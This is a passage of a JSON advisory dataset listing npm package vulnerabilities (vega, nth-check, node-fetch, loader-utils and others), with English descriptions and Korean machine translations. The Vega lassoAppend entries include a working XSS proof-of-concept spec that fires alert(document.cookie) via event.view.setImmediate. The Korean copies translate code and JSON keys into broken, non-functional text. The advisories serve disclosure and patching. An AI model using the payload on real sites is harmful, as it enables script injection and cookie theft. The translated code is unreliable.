    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 5.13.1",
    "identifier": "5.13.1",
    "descriptionKR": "### 요약\n\nVega의 `lassoAppend` 함수: `lassoAppend`는 3개의 인수를 받아들이고 `push` 호출 인수로 두 번째 및 세 번째 인수로 구성된 배열을 지정하는 첫 번째 인수에서 내부적으로 `push` 함수를 호출합니다. 첫 번째 인수의 유형은 배열이어야 하지만 적용되지는 않습니다.\n\n이렇게 하면 `push` 함수가 있는 개체를 첫 번째 인수로 지정할 수 있으며 `push` 함수는 `event.view`를 통해 액세스할 수 있는 모든 함수로 설정할 수 있습니다(이러한 모든 함수는 유효하지 않기 때문에 악용될 수 없습니다. 컨텍스트 또는 서명이지만 일부는 예를 들어 `console.log`).\n\n### 세부 정보\n문제는 [`lassoAppend`](https://github.com/vega/vega/blob/7eafbbd4d53d0ce9f08e74ff96c90d411b1bb80a/packages/vega-functions/src/functions/lasso.js#L13)가 적절한 형식을 적용하지 않는다는 것입니다. 인수:\n```js\n.....\n내보내기 기능 lassoAppend(lasso, x, y, minDist = 5) {\n    const last = lasso[lasso.length - 1];\n\n    // 마지막 점까지의 거리가 minDist 또는 첫 번째 점을 초과하는 경우 올가미에 점을 추가합니다.\n    if (last === 정의되지 않음 || Math.sqrt(((last[0] - x) ** 2) + ((last[1] - y) ** 2)) > minDist) {\n        lasso.push([x,y]);\n.....\n```\n\n### PoC\n\n다음 Vega 스니펫을 사용하십시오(브라우저의 비내장 `event.view.setImmediate` 기능에 따라 다름, `event.view.console.log` 또는 유사 항목으로 자유롭게 대체하고 브라우저 콘솔에서 결과를 관찰하십시오).\n\n```json\n{\n  \"$스키마\": \"https://vega.github.io/schema/vega/v5.json\",\n  \"너비\": 350,\n  \"높이\": 350,\n  \"autosize\": \"없음\",\n  \"description\": \"토글 버튼\",\n  \"신호\": [\n    {\n      \"이름\": \"토글\",\n      \"값\": 거짓,\n      \"에\": [\n        {\n          \"이벤트\": {\"유형\": \"클릭\", \"마크 이름\": \"서클\"},\n          \"업데이트\": \"토글 ? 거짓: 참\"\n        }\n      ]\n    },\n    {\n      \"이름\": \"addFilter\",\n      \"에\": [\n        {\n          \"이벤트\": {\"유형\": \"mousemove\", \"소스\": \"창\"},\n          \"업데이트\": \"lassoAppend({'push':event.view.setImmediate},'alert(document.domain)','alert(document.cookie)')\"\n        }\n      ]\n    }\n  ],\n  \"표시\": [\n    {\n      \"이름\": \"서클\",\n      \"유형\": \"기호\",\n      \"지인덱스\": 1,\n      \"인코딩\": {\n        \"입력하다\": {\n          \"y\": {\"신호\": \"높이/2\"},\n          \"각도\": {\"값\": 0},\n          \"크기\": {\"값\": 400},\n          \"모양\": {\"값\": \"원\"},\n          \"채우기\": {\"값\": \"흰색\"},\n          \"스트로크\": {\"값\": \"흰색\"},\n          \"strokeWidth\": {\"값\": 2},\n          \"커서\": {\"값\": \"포인터\"},\n          \"tooltip\": {\"신호\": \"{팁: 'XSS를 실행하려면 클릭'}\"}\n        },\n        \"업데이트\": {\"x\": {\"신호\": \"토글 === 참 ? 190: 165\"}}\n      }\n    },\n    {\n      \"이름\": \"직사각형\",\n      \"유형\": \"직접\",\n      \"지인덱스\": 0,\n      \"인코딩\": {\n        \"입력하다\": {\n          \"x\": {\"값\": 152},\n          \"y\": {\"값\": 162.5},\n          \"너비\": {\"값\": 50},\n          \"높이\": {\"값\": 25},\n          \"코너 반경\": {\"값\": 20}\n        },\n        \"업데이트\": {\n          \"채우기\": {\"신호\": \"토글 === 참 ? '#006BB4' : '#939597'\"}\n        }\n      }\n    }\n  ]\n}\n```\n\n### 영향\n이 문제는 다양한 XSS 벡터를 열지만 정확한 영향과 심각도는 환경에 따라 다릅니다(예: Core JS `setImmediate` 폴리필은 기본적으로 `eval`과 같은 기능을 허용합니다)."
  },
  {
    "description": "### Summary\n\nVega's `lassoAppend` function: `lassoAppend` accepts 3 arguments and internally invokes `push` function on the 1st argument specifying array consisting of 2nd and 3rd arguments as `push` call argument. The type of the 1st argument is supposed to be an array, but it's not enforced.\n\nThis makes it possible to specify any object with a `push` function as the 1st argument, `push` function can be set to any function that can be access via `event.view` (no all such functions can be exploited due to invalid context or signature, but some can, e.g. `console.log`).\n\n### Details\nThe issue is that [`lassoAppend`](https://github.com/vega/vega/blob/7eafbbd4d53d0ce9f08e74ff96c90d411b1bb80a/packages/vega-functions/src/functions/lasso.js#L13) doesn't enforce proper types of its arguments:\n```js\n.....\nexport function lassoAppend(lasso, x, y, minDist = 5) {\n    const last = lasso[lasso.length - 1];\n\n    // Add point to lasso if distance to last point exceed minDist or its the first point\n    if (last === undefined || Math.sqrt(((last[0] - x) ** 2) + ((last[1] - y) ** 2)) > minDist) {\n        lasso.push([x, y]);\n.....\n```\n\n### PoC\n\nUse the following Vega snippet (depends on browser's non-built-in `event.view.setImmediate` function, feel free to replace with `event.view.console.log` or alike and observe the result in the browser's console)\n\n```json\n{\n  \"$schema\": \"https://vega.github.io/schema/vega/v5.json\",\n  \"width\": 350,\n  \"height\": 350,\n  \"autosize\": \"none\",\n  \"description\": \"Toggle Button\",\n  \"signals\": [\n    {\n      \"name\": \"toggle\",\n      \"value\": false,\n      \"on\": [\n        {\n          \"events\": {\"type\": \"click\", \"markname\": \"circle\"},\n          \"update\": \"toggle ? false : true\"\n        }\n      ]\n    },\n    {\n      \"name\": \"addFilter\",\n      \"on\": [\n        {\n          \"events\": {\"type\": \"mousemove\", \"source\": \"window\"},\n          \"update\": \"lassoAppend({'push':event.view.setImmediate},'alert(document.domain)','alert(document.cookie)')\"\n        }\n      ]\n    }\n  ],\n  \"marks\": [\n    {\n      \"name\": \"circle\",\n      \"type\": \"symbol\",\n      \"zindex\": 1,\n      \"encode\": {\n        \"enter\": {\n          \"y\": {\"signal\": \"height/2\"},\n          \"angle\": {\"value\": 0},\n          \"size\": {\"value\": 400},\n          \"shape\": {\"value\": \"circle\"},\n          \"fill\": {\"value\": \"white\"},\n          \"stroke\": {\"value\": \"white\"},\n          \"strokeWidth\": {\"value\": 2},\n          \"cursor\": {\"value\": \"pointer\"},\n          \"tooltip\": {\"signal\": \"{Tip: 'Click to fire XSS'}\"}\n        },\n        \"update\": {\"x\": {\"signal\": \"toggle === true ? 190 : 165\"}}\n      }\n    },\n    {\n      \"name\": \"rectangle\",\n      \"type\": \"rect\",\n      \"zindex\": 0,\n      \"encode\": {\n        \"enter\": {\n          \"x\": {\"value\": 152},\n          \"y\": {\"value\": 162.5},\n          \"width\": {\"value\": 50},\n          \"height\": {\"value\": 25},\n          \"cornerRadius\": {\"value\": 20}\n        },\n        \"update\": {\n          \"fill\": {\"signal\": \"toggle === true ? '#006BB4' : '#939597'\"}\n        }\n      }\n    }\n  ]\n}\n```\n\n### Impact\nThis issue opens various XSS vectors, but exact impact and severity depends on the environment (e.g. Core JS `setImmediate` polyfill basically allows `eval`-like functionality).\n",
    "identifiers": "GHSA : GHSA-w5m3-xh75-mp55\nCVE : CVE-2023-26487",
    "severity": "MODERATE",
    "updatedAt": "2023-03-13T15:30:51Z",
    "publishedAt": "2023-03-02T23:08:21Z",
    "references": "https://github.com/vega/vega/security/advisories/GHSA-w5m3-xh75-mp55\nhttps://github.com/vega/vega/commit/01adb034f24727d3bb321bbbb6696a7f4cd91689\nhttps://github.com/vega/vega/releases/tag/v5.23.0\nhttps://nvd.nist.gov/vuln/detail/CVE-2023-26487\nhttps://github.com/advisories/GHSA-w5m3-xh75-mp55",
    "name": "vega",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 5.23.0",
    "identifier": "5.23.0",
    "descriptionKR": "### 요약\n\nVega의 `lassoAppend` 함수: `lassoAppend`는 3개의 인수를 받아들이고 `push` 호출 인수로 두 번째 및 세 번째 인수로 구성된 배열을 지정하는 첫 번째 인수에서 내부적으로 `push` 함수를 호출합니다. 첫 번째 인수의 유형은 배열이어야 하지만 적용되지는 않습니다.\n\n이렇게 하면 `push` 함수가 있는 개체를 첫 번째 인수로 지정할 수 있으며 `push` 함수는 `event.view`를 통해 액세스할 수 있는 모든 함수로 설정할 수 있습니다(이러한 모든 함수는 유효하지 않기 때문에 악용될 수 없습니다. 컨텍스트 또는 서명이지만 일부는 예를 들어 `console.log`).\n\n### 세부 정보\n문제는 [`lassoAppend`](https://github.com/vega/vega/blob/7eafbbd4d53d0ce9f08e74ff96c90d411b1bb80a/packages/vega-functions/src/functions/lasso.js#L13)가 적절한 형식을 적용하지 않는다는 것입니다. 인수:\n```js\n.....\n내보내기 기능 lassoAppend(lasso, x, y, minDist = 5) {\n    const last = lasso[lasso.length - 1];\n\n    // 마지막 점까지의 거리가 minDist 또는 첫 번째 점을 초과하는 경우 올가미에 점을 추가합니다.\n    if (last === 정의되지 않음 || Math.sqrt(((last[0] - x) ** 2) + ((last[1] - y) ** 2)) > minDist) {\n        lasso.push([x,y]);\n.....\n```\n\n### PoC\n\n다음 Vega 스니펫을 사용하십시오(브라우저의 비내장 `event.view.setImmediate` 기능에 따라 다름, `event.view.console.log` 또는 유사 항목으로 자유롭게 대체하고 브라우저 콘솔에서 결과를 관찰하십시오).\n\n```json\n{\n  \"$스키마\": \"https://vega.github.io/schema/vega/v5.json\",\n  \"너비\": 350,\n  \"높이\": 350,\n  \"autosize\": \"없음\",\n  \"description\": \"토글 버튼\",\n  \"신호\": [\n    {\n      \"이름\": \"토글\",\n      \"값\": 거짓,\n      \"에\": [\n        {\n          \"이벤트\": {\"유형\": \"클릭\", \"마크 이름\": \"서클\"},\n          \"업데이트\": \"토글 ? 거짓: 참\"\n        }\n      ]\n    },\n    {\n      \"이름\": \"addFilter\",\n      \"에\": [\n        {\n          \"이벤트\": {\"유형\": \"mousemove\", \"소스\": \"창\"},\n          \"업데이트\": \"lassoAppend({'push':event.view.setImmediate},'alert(document.domain)','alert(document.cookie)')\"\n        }\n      ]\n    }\n  ],\n  \"표시\": [\n    {\n      \"이름\": \"서클\",\n      \"유형\": \"기호\",\n      \"지인덱스\": 1,\n      \"인코딩\": {\n        \"입력하다\": {\n          \"y\": {\"신호\": \"높이/2\"},\n          \"각도\": {\"값\": 0},\n          \"크기\": {\"값\": 400},\n          \"모양\": {\"값\": \"원\"},\n          \"채우기\": {\"값\": \"흰색\"},\n          \"스트로크\": {\"값\": \"흰색\"},\n          \"strokeWidth\": {\"값\": 2},\n          \"커서\": {\"값\": \"포인터\"},\n          \"tooltip\": {\"신호\": \"{팁: 'XSS를 실행하려면 클릭'}\"}\n        },\n        \"업데이트\": {\"x\": {\"신호\": \"토글 === 참 ? 190: 165\"}}\n      }\n    },\n    {\n      \"이름\": \"직사각형\",\n      \"유형\": \"직접\",\n      \"지인덱스\": 0,\n      \"인코딩\": {\n        \"입력하다\": {\n          \"x\": {\"값\": 152},\n          \"y\": {\"값\": 162.5},\n          \"너비\": {\"값\": 50},\n          \"높이\": {\"값\": 25},\n          \"코너 반경\": {\"값\": 20}\n        },\n        \"업데이트\": {\n          \"채우기\": {\"신호\": \"토글 === 참 ? '#006BB4' : '#939597'\"}\n        }\n      }\n    }\n  ]\n}\n```\n\n### 영향\n이 문제는 다양한 XSS 벡터를 열지만 정확한 영향과 심각도는 환경에 따라 다릅니다(예: Core JS `setImmediate` 폴리필은 기본적으로 `eval`과 같은 기능을 허용합니다)."
  },
  {
    "description": "nth-check is vulnerable to Inefficient Regular Expression Complexity",
    "identifiers": "GHSA : GHSA-rp65-9cf3-cjxr\nCVE : CVE-2021-3803",
    "severity": "HIGH",
    "updatedAt": "2023-05-23T19:43:43Z",
    "publishedAt": "2021-09-20T20:47:31Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2021-3803\nhttps://github.com/fb55/nth-check/commit/9894c1d2010870c351f66c6f6efcf656e26bb726\nhttps://huntr.dev/bounties/8cf8cc06-d2cf-4b4e-b42c-99fafb0b04d0\nhttps://lists.debian.org/debian-lts-announce/2023/05/msg00023.html\nhttps://github.com/advisories/GHSA-rp65-9cf3-cjxr",
    "name": "nth-check",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 2.0.1",
    "identifier": "2.0.1",
    "descriptionKR": "nth-check는 비효율적인 정규식 복잡성에 취약합니다."
  },
  {
    "description": "This affects all versions of package ansi-html. If an attacker provides a malicious string, it will get stuck processing the input for an extremely long time.",
    "identifiers": "GHSA : GHSA-whgm-jr23-g3j9\nCVE : CVE-2021-23424",
    "severity": "HIGH",
    "updatedAt": "2023-03-02T21:42:26Z",
    "publishedAt": "2021-09-02T17:15:24Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2021-23424\nhttps://github.com/Tjatse/ansi-html/issues/19\nhttps://snyk.io/vuln/SNYK-JS-ANSIHTML-1296849\nhttps://github.com/ioet/time-tracker-ui/security/advisories/GHSA-4fjc-8q3h-8r69\nhttps://github.com/Tjatse/ansi-html/commit/8142b25bca3133ea060bcc1889277dc482327a63\nhttps://snyk.io/vuln/SNYK-JAVA-ORGWEBJARSNPM-1567198\nhttps://github.com/advisories/GHSA-whgm-jr23-g3j9",
    "name": "ansi-html",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 0.0.8",
    "identifier": "0.0.8",
    "descriptionKR": "이것은 패키지 ansi-html의 모든 버전에 영향을 미칩니다. 공격자가 악의적인 문자열을 제공하면 매우 오랜 시간 동안 입력 처리가 중단됩니다."
  },
  {
    "description": "follow-redirects is vulnerable to Exposure of Private Personal Information to an Unauthorized Actor",
    "identifiers": "GHSA : GHSA-74fj-2j2h-c42q\nCVE : CVE-2022-0155",
    "severity": "HIGH",
    "updatedAt": "2023-03-02T21:37:51Z",
    "publishedAt": "2022-01-12T22:46:26Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2022-0155\nhttps://github.com/follow-redirects/follow-redirects/commit/8b347cbcef7c7b72a6e9be20f5710c17d6163c22\nhttps://huntr.dev/bounties/fc524e4b-ebb6-427d-ab67-a64181020406\nhttps://cert-portal.siemens.com/productcert/pdf/ssa-637483.pdf\nhttps://github.com/advisories/GHSA-74fj-2j2h-c42q",
    "name": "follow-redirects",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 1.14.7",
    "identifier": "1.14.7",
    "descriptionKR": "follow-redirects는 승인되지 않은 행위자에게 개인 정보 노출에 취약합니다."
  },
  {
    "description": "node-fetch is vulnerable to Exposure of Sensitive Information to an Unauthorized Actor",
    "identifiers": "GHSA : GHSA-r683-j2x4-v87g\nCVE : CVE-2022-0235",
    "severity": "HIGH",
    "updatedAt": "2023-03-02T21:34:14Z",
    "publishedAt": "2022-01-21T23:55:52Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2022-0235\nhttps://github.com/node-fetch/node-fetch/commit/36e47e8a6406185921e4985dcbeff140d73eaa10\nhttps://huntr.dev/bounties/d26ab655-38d6-48b3-be15-f9ad6b6ae6f7\nhttps://github.com/node-fetch/node-fetch/pull/1453\nhttps://github.com/node-fetch/node-fetch/commit/5c32f002fdd65b1c6a8f1e3620210813d45c7e60\nhttps://cert-portal.siemens.com/productcert/pdf/ssa-637483.pdf\nhttps://lists.debian.org/debian-lts-announce/2022/12/msg00007.html\nhttps://github.com/node-fetch/node-fetch/pull/1449/commits/5c32f002fdd65b1c6a8f1e3620210813d45c7e60\nhttps://github.com/node-fetch/node-fetch/commit/1ef4b560a17e644a02a3bfdea7631ffeee578b35\nhttps://github.com/advisories/GHSA-r683-j2x4-v87g",
    "name": "node-fetch",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 2.6.7",
    "identifier": "2.6.7",
    "descriptionKR": "node-fetch는 승인되지 않은 행위자에게 민감한 정보 노출에 취약합니다."
  },
  {
    "description": "node-fetch is vulnerable to Exposure of Sensitive Information to an Unauthorized Actor",
    "identifiers": "GHSA : GHSA-r683-j2x4-v87g\nCVE : CVE-2022-0235",
    "severity": "HIGH",
    "updatedAt": "2023-03-02T21:34:14Z",
    "publishedAt": "2022-01-21T23:55:52Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2022-0235\nhttps://github.com/node-fetch/node-fetch/commit/36e47e8a6406185921e4985dcbeff140d73eaa10\nhttps://huntr.dev/bounties/d26ab655-38d6-48b3-be15-f9ad6b6ae6f7\nhttps://github.com/node-fetch/node-fetch/pull/1453\nhttps://github.com/node-fetch/node-fetch/commit/5c32f002fdd65b1c6a8f1e3620210813d45c7e60\nhttps://cert-portal.siemens.com/productcert/pdf/ssa-637483.pdf\nhttps://lists.debian.org/debian-lts-announce/2022/12/msg00007.html\nhttps://github.com/node-fetch/node-fetch/pull/1449/commits/5c32f002fdd65b1c6a8f1e3620210813d45c7e60\nhttps://github.com/node-fetch/node-fetch/commit/1ef4b560a17e644a02a3bfdea7631ffeee578b35\nhttps://github.com/advisories/GHSA-r683-j2x4-v87g",
    "name": "node-fetch",
    "ecosystem": "NPM",
    "vulnerableVersionRange": ">= 3.0.0, < 3.1.1",
    "identifier": "3.1.1",
    "descriptionKR": "node-fetch는 승인되지 않은 행위자에게 민감한 정보 노출에 취약합니다."
  },
  {
    "description": "Prototype pollution vulnerability in dot-prop npm package versions before 4.2.1 and versions 5.x before 5.1.1 allows an attacker to add arbitrary properties to JavaScript language constructs such as objects.",
    "identifiers": "GHSA : GHSA-ff7x-qrg7-qggm\nCVE : CVE-2020-8116",
    "severity": "HIGH",
    "updatedAt": "2023-03-02T21:23:58Z",
    "publishedAt": "2020-07-29T20:56:59Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2020-8116\nhttps://hackerone.com/reports/719856\nhttps://github.com/sindresorhus/dot-prop/issues/63\nhttps://github.com/advisories/GHSA-ff7x-qrg7-qggm\nhttps://github.com/sindresorhus/dot-prop/tree/v4\nhttps://github.com/sindresorhus/dot-prop/commit/3039c8c07f6fdaa8b595ec869ae0895686a7a0f2\nhttps://github.com/sindresorhus/dot-prop/commit/c914124f418f55edea27928e89c94d931babe587",
    "name": "dot-prop",
    "ecosystem": "NPM",
    "vulnerableVersionRange": ">= 5.0.0, < 5.1.1",
    "identifier": "5.1.1",
    "descriptionKR": "4.2.1 이전의 dot-prop npm 패키지 버전 및 5.1.1 이전의 5.x 버전의 프로토타입 오염 취약성으로 인해 공격자가 개체와 같은 JavaScript 언어 구성에 임의 속성을 추가할 수 있습니다."
  },
  {
    "description": "Prototype pollution vulnerability in dot-prop npm package versions before 4.2.1 and versions 5.x before 5.1.1 allows an attacker to add arbitrary properties to JavaScript language constructs such as objects.",
    "identifiers": "GHSA : GHSA-ff7x-qrg7-qggm\nCVE : CVE-2020-8116",
    "severity": "HIGH",
    "updatedAt": "2023-03-02T21:23:58Z",
    "publishedAt": "2020-07-29T20:56:59Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2020-8116\nhttps://hackerone.com/reports/719856\nhttps://github.com/sindresorhus/dot-prop/issues/63\nhttps://github.com/advisories/GHSA-ff7x-qrg7-qggm\nhttps://github.com/sindresorhus/dot-prop/tree/v4\nhttps://github.com/sindresorhus/dot-prop/commit/3039c8c07f6fdaa8b595ec869ae0895686a7a0f2\nhttps://github.com/sindresorhus/dot-prop/commit/c914124f418f55edea27928e89c94d931babe587",
    "name": "dot-prop",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 4.2.1",
    "identifier": "4.2.1",
    "descriptionKR": "4.2.1 이전의 dot-prop npm 패키지 버전 및 5.1.1 이전의 5.x 버전의 프로토타입 오염 취약성으로 인해 공격자가 개체와 같은 JavaScript 언어 구성에 임의 속성을 추가할 수 있습니다."
  },
  {
    "description": "Versions of `kind-of` 6.x prior to 6.0.3 are vulnerable to a Validation Bypass. A maliciously crafted object can alter the result of the type check, allowing attackers to bypass the type checking validation. \n\n\n## Recommendation\n\nUpgrade to versions 6.0.3 or later.",
    "identifiers": "GHSA : GHSA-6c8f-qphg-qjgp\nCVE : CVE-2019-20149",
    "severity": "HIGH",
    "updatedAt": "2023-03-02T21:20:11Z",
    "publishedAt": "2020-03-31T15:59:54Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2019-20149\nhttps://github.com/jonschlinkert/kind-of/issues/30\nhttps://github.com/jonschlinkert/kind-of/pull/31\nhttps://github.com/jonschlinkert/kind-of/commit/1df992ce6d5a1292048e5fe9c52c5382f941ee0b\nhttps://snyk.io/vuln/SNYK-JS-KINDOF-537849\nhttps://www.npmjs.com/advisories/1490\nhttps://github.com/advisories/GHSA-6c8f-qphg-qjgp",
    "name": "kind-of",
    "ecosystem": "NPM",
    "vulnerableVersionRange": ">= 6.0.0, < 6.0.3",
    "identifier": "6.0.3",
    "descriptionKR": "6.0.3 이전의 '종류' 6.x 버전은 유효성 검사 우회에 취약합니다. 악의적으로 제작된 개체는 유형 검사 결과를 변경하여 공격자가 유형 검사 유효성 검사를 우회할 수 있도록 합니다.\n\n\n## 추천\n\n버전 6.0.3 이상으로 업그레이드하십시오."
  },
  {
    "description": "This affects the package `set-value` before 2.0.1, and starting with 3.0.0 but prior to 4.0.1. A type confusion vulnerability can lead to a bypass of CVE-2019-10747 when the user-provided keys used in the path parameter are arrays.",
    "identifiers": "GHSA : GHSA-4jqc-8m5r-9rpr\nCVE : CVE-2021-23440",
    "severity": "HIGH",
    "updatedAt": "2023-03-10T05:05:42Z",
    "publishedAt": "2021-09-13T20:09:36Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2021-23440\nhttps://github.com/jonschlinkert/set-value/pull/33\nhttps://github.com/jonschlinkert/set-value/commit/7cf8073bb06bf0c15e08475f9f952823b4576452\nhttps://snyk.io/vuln/SNYK-JAVA-ORGWEBJARSNPM-1584212\nhttps://snyk.io/vuln/SNYK-JS-SETVALUE-1540541\nhttps://www.huntr.dev/bounties/2eae1159-01de-4f82-a177-7478a408c4a2/\nhttps://www.oracle.com/security-alerts/cpujan2022.html\nhttps://github.com/jonschlinkert/set-value/pull/33/commits/383b72d47c74a55ae8b6e231da548f9280a4296a\nhttps://github.com/jonschlinkert/set-value/commit/cb12f14955dde6e61829d70d1851bfea6a3c31ad\nhttps://github.com/advisories/GHSA-4jqc-8m5r-9rpr",
    "name": "set-value",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 2.0.1",
    "identifier": "2.0.1",
    "descriptionKR": "이는 2.0.1 이전의 패키지 `set-value`에 영향을 미치며 3.0.0부터 시작하여 4.0.1 이전에 적용됩니다. 경로 매개변수에 사용된 사용자 제공 키가 배열인 경우 유형 혼동 취약성으로 인해 CVE-2019-10747을 우회할 수 있습니다."
  },
  {
    "description": "A Regular expression denial of service (ReDoS) flaw was found in Function interpolateName in interpolateName.js in webpack loader-utils 2.0.0 via the url variable in interpolateName.js. A badly or maliciously formed string could be used to send crafted requests that cause a system to crash or take a disproportional amount of time to process. This issue has been patched in versions 1.4.2, 2.0.4 and 3.2.1.",
    "identifiers": "GHSA : GHSA-3rfm-jhwj-7488\nCVE : CVE-2022-37603",
    "severity": "HIGH",
    "updatedAt": "2023-08-08T21:28:15Z",
    "publishedAt": "2022-10-14T19:00:38Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2022-37603\nhttps://github.com/webpack/loader-utils/issues/213\nhttps://github.com/webpack/loader-utils/blob/d9f4e23cf411d8556f8bac2d3bf05a6e0103b568/lib/interpolateName.js#L107\nhttps://github.com/webpack/loader-utils/blob/d9f4e23cf411d8556f8bac2d3bf05a6e0103b568/lib/interpolateName.js#L38\nhttps://github.com/webpack/loader-utils/issues/216\nhttps://github.com/webpack/loader-utils/commit/17cbf8fa8989c1cb45bdd2997aa524729475f1fa\nhttps://github.com/webpack/loader-utils/commit/ac09944dfacd7c4497ef692894b09e63e09a5eeb\nhttps://github.com/webpack/loader-utils/commit/d2d752d59629daee38f34b24307221349c490eb1\nhttps://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/ERN6YE3DS7NBW7UH44SCJBMNC2NWQ7SM/\nhttps://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/KAC5KQ2SEWAMQ6UZAUBZ5KXKEOESH375/\nhttps://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/VNV2GNZXOTEDAJRFH3ZYWRUBGIVL7BSU/\nhttps://github.com/advisories/GHSA-3rfm-jhwj-7488",
    "name": "loader-utils",
    "ecosystem": "NPM",
    "vulnerableVersionRange": ">= 3.0.0, < 3.2.1",
    "identifier": "3.2.1",
    "descriptionKR": "interpolateName.js의 url 변수를 통해 webpack loader-utils 2.0.0의 interpolateName.js에 있는 함수 interpolateName에서 정규식 서비스 거부(ReDoS) 결함이 발견되었습니다. 잘못 또는 악의적으로 구성된 문자열을 사용하여 시스템을 충돌시키거나 처리하는 데 불균형한 시간이 걸리는 조작된 요청을 보낼 수 있습니다. 이 문제는 버전 1.4.2, 2.0.4 및 3.2.1에서 패치되었습니다."
  },
  {
    "description": "A Regular expression denial of service (ReDoS) flaw was found in Function interpolateName in interpolateName.js in webpack loader-utils 2.0.0 via the url variable in interpolateName.js. A badly or maliciously formed string could be used to send crafted requests that cause a system to crash or take a disproportional amount of time to process. This issue has been patched in versions 1.4.2, 2.0.4 and 3.2.1.",
    "identifiers": "GHSA : GHSA-3rfm-jhwj-7488\nCVE : CVE-2022-37603",
    "severity": "HIGH",
    "updatedAt": "2023-08-08T21:28:15Z",
    "publishedAt": "2022-10-14T19:00:38Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2022-37603\nhttps://github.com/webpack/loader-utils/issues/213\nhttps://github.com/webpack/loader-utils/blob/d9f4e23cf411d8556f8bac2d3bf05a6e0103b568/lib/interpolateName.js#L107\nhttps://github.com/webpack/loader-utils/blob/d9f4e23cf411d8556f8bac2d3bf05a6e0103b568/lib/interpolateName.js#L38\nhttps://github.com/webpack/loader-utils/issues/216\nhttps://github.com/webpack/loader-utils/commit/17cbf8fa8989c1cb45bdd2997aa524729475f1fa\nhttps://github.com/webpack/loader-utils/commit/ac09944dfacd7c4497ef692894b09e63e09a5eeb\nhttps://github.com/webpack/loader-utils/commit/d2d752d59629daee38f34b24307221349c490eb1\nhttps://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/ERN6YE3DS7NBW7UH44SCJBMNC2NWQ7SM/\nhttps://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/KAC5KQ2SEWAMQ6UZAUBZ5KXKEOESH375/\nhttps://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/VNV2GNZXOTEDAJRFH3ZYWRUBGIVL7BSU/\nhttps://github.com/advisories/GHSA-3rfm-jhwj-7488",
    "name": "loader-utils",
    "ecosystem": "NPM",
    "vulnerableVersionRange": ">= 2.0.0, < 2.0.4",
    "identifier": "2.0.4",
    "descriptionKR": "interpolateName.js의 url 변수를 통해 webpack loader-utils 2.0.0의 interpolateName.js에 있는 함수 interpolateName에서 정규식 서비스 거부(ReDoS) 결함이 발견되었습니다. 잘못 또는 악의적으로 구성된 문자열을 사용하여 시스템을 충돌시키거나 처리하는 데 불균형한 시간이 걸리는 조작된 요청을 보낼 수 있습니다. 이 문제는 버전 1.4.2, 2.0.4 및 3.2.1에서 패치되었습니다."
  },
  {
    "description": "A Regular expression denial of service (ReDoS) flaw was found in Function interpolateName in interpolateName.js in webpack loader-utils 2.0.0 via the url variable in interpolateName.js. A badly or maliciously formed string could be used to send crafted requests that cause a system to crash or take a disproportional amount of time to process. This issue has been patched in versions 1.4.2, 2.0.4 and 3.2.1.",
    "identifiers": "GHSA : GHSA-3rfm-jhwj-7488\nCVE : CVE-2022-37603",
    "severity": "HIGH",
    "updatedAt": "2023-08-08T21:28:15Z",
    "publishedAt": "2022-10-14T19:00:38Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2022-37603\nhttps://github.com/webpack/loader-utils/issues/213\nhttps://github.com/webpack/loader-utils/blob/d9f4e23cf411d8556f8bac2d3bf05a6e0103b568/lib/interpolateName.js#L107\nhttps://github.com/webpack/loader-utils/blob/d9f4e23cf411d8556f8bac2d3bf05a6e0103b568/lib/interpolateName.js#L38\nhttps://github.com/webpack/loader-utils/issues/216\nhttps://github.com/webpack/loader-utils/commit/17cbf8fa8989c1cb45bdd2997aa524729475f1fa\nhttps://github.com/webpack/loader-utils/commit/ac09944dfacd7c4497ef692894b09e63e09a5eeb\nhttps://github.com/webpack/loader-utils/commit/d2d752d59629daee38f34b24307221349c490eb1\nhttps://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/ERN6YE3DS7NBW7UH44SCJBMNC2NWQ7SM/\nhttps://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/KAC5KQ2SEWAMQ6UZAUBZ5KXKEOESH375/\nhttps://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/VNV2GNZXOTEDAJRFH3ZYWRUBGIVL7BSU/\nhttps://github.com/advisories/GHSA-3rfm-jhwj-7488",
    "name": "loader-utils",
    "ecosystem": "NPM",
    "vulnerableVersionRange": ">= 1.0.0, < 1.4.2",
    "identifier": "1.4.2",
    "descriptionKR": "interpolateName.js의 url 변수를 통해 webpack loader-utils 2.0.0의 interpolateName.js에 있는 함수 interpolateName에서 정규식 서비스 거부(ReDoS) 결함이 발견되었습니다. 잘못 또는 악의적으로 구성된 문자열을 사용하여 시스템을 충돌시키거나 처리하는 데 불균형한 시간이 걸리는 조작된 요청을 보낼 수 있습니다. 이 문제는 버전 1.4.2, 2.0.4 및 3.2.1에서 패치되었습니다."
  },
  {
